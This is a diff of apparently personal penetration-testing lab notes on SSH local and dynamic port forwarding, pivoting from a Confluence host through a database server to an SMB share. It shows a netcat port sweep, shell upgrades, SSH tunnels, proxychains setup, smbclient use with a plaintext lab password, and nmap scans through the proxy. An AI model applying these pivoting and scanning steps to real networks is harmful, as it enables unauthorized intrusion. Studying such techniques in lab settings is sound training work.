@@ -258,7 +258,7 @@ pgdatabase01$ ip route
 PGDATABASE01 is connected to another subnet in 172.*! There is not a port instakked on PGDATABASE01, but we can do some recon. 
 
 ```console
-// sweep fro hosts with open port 445 on this new 172. submet
+// sweep for hosts with open port 445 on this new 172. submet
 
 pgdatabase01$ for i in $(seq 1 254); do nc -zv -w 1 172.16.210.$i 445; done
 
@@ -277,7 +277,7 @@ For this simple example, there is not firewall preventing us from accessing the 
 Kill the existing SSH con to PGDATABSE01 and set up a new one with new arguments to establish the SSH port forward.
 
 ```console
-confluence$ sh -N -L 0.0.0.0:4455:172.16.210.217:445 database_admin@10.4.210.215
+confluence$ ssh -N -L 0.0.0.0:4455:172.16.210.217:445 database_admin@10.4.210.215
 Could not create directory '/home/confluence/.ssh'.
 The authenticity of host '10.4.50.215 (10.4.50.215)' can't be established.
 ECDSA key fingerprint is SHA256:K9x2nuKxQIb/YJtyN/YmDBVQ8Kyky7tEqieIyt1ytH4.
@@ -289,7 +289,7 @@ Failed to add the host to the list of known hosts (/home/confluence/.ssh/known_h
 
 confluence$ python3 -c 'import pty; pty.spawn("/bin/sh")'
 
-confluence$ sh -N -L 0.0.0.0:4455:172.16.210.217:445 database_admin@10.4.210.215
+confluence$ ssh -N -L 0.0.0.0:4455:172.16.210.217:445 database_admin@10.4.210.215
 ```
 
 Once you enter the password, you won't get any output since we are running SSH with the -N flag. With -N, SSH won't execute any remote commands, so we will only recieve output related to our port forward.
@@ -328,3 +328,64 @@ smb: \> get Provisioning.ps1
 ```
 
 You can inspect the files you get directly on Kali.
+
+### SSH Dynamic Port Forwarding
+
+One limitating of local port forwarding is that we can only connect to one socket per SSH session, which can make tests tedious. OpenSSH provides dynamic port forwarding where we can listen on one port on the SSH client and forward packets to any socket that the SSH server host has access to.
+
+SSH dynamic port forwarding works because the listening port the SSH client creates is a SOCKS proxy server port (SOCKS is a proxying protocol, and SOCKS servers accept packets with SOCKS protocol headers and forwards them to wherever they're addressed.)
+
+The only limitation is that the packets have to be formatted properly, usually by SOCK-compatible client software. Some software is not SOCKS-compatible by default, which we'll address later.
+
+Imagine we want to listen on TCP port 9999 on the WAN iface on CONFLUENCE01, sending SOCKS format packets to the 9999 port that are pushed through the SSH tunnel to PGDATABASE01, and lastly forwarded to where we address them.
+
+We will still be able to access the SMG port on HRSHARES while we are also accessing any other port on any other host that PGDATABASE01 has access to. Through one port! Just make sure that whatever software we use can send packets in the right SOCKS format.
+
+In addition to connecting to the SMB port on HRSHARES, we also want to do a full port scan on HRSHARES. 
+
+```console
+// ensure we're in a tty shell
+confluence$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+// ssh conn to PGDATABASE01 with database_admin creds and dynamic port with -D flag
+confluence$ ssh -N -D 0.0.0.0:9999 database_admin@10.4.50.215
+
+// you won't receive output after the password, you can always check it worked with another confluence shell and "ss -ntplu"
+```
+
+Let's connect to port 445 on HRSHARES through the SOCKS proxy port created by our SSH dynamic port forward command. There is not a native option to use a SOCKS proxy in smbclient, so we'kk leverage Proxychains (forces network traffic from third party tools over HTTP or SOCKS proxies, or can be configured to push traffic over a chain of concurrent proxies) with smbclient.
+
+2 NOTES: Proxychains will work for most dynamically-linked binaries, but not statically-linked binaries. Socks5 supports authentication, IPv6, and User Datagram Protocol (UDP), including DNS. However, some SOCKS proxies will only support SOCKS4,.
+
+Edit the /etc/proxychains4.conf to fit what we need:
+
+```console
+// what it should look like for this example
+kali$ tail /etc/proxychains4.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to "tor"
+socks4  192.168.210.63 9999
+```
+
+Now we can list the available HRSHARES shares with smbclient from Kali. Instead of connected to the port on CONFLUENCE01, we will write the smbclient cmd as if we have a direct conn to PGDATABASE01. Prepend poxychains, and it will force the traffic through the proxy we just specified in the conf file.
+
+```console
+kali$ proxychains smbclient -L //172.16.210.217/ -U hr_admin --password=Welcome1234
+Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        IPC$            IPC       Remote IPC
+        Scripts         Disk      
+        Users           Disk
+```
+
+Let's take it further and portscan HRSHARES.
+
+```console
+kali $ proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.210.217
+```
+
+NOTE: Rpoxychain has high time out values by defual, so you can lower the tcp_read_time_out and tcp_connect_time_out values in the Proxychains conf to speed up port scanning.
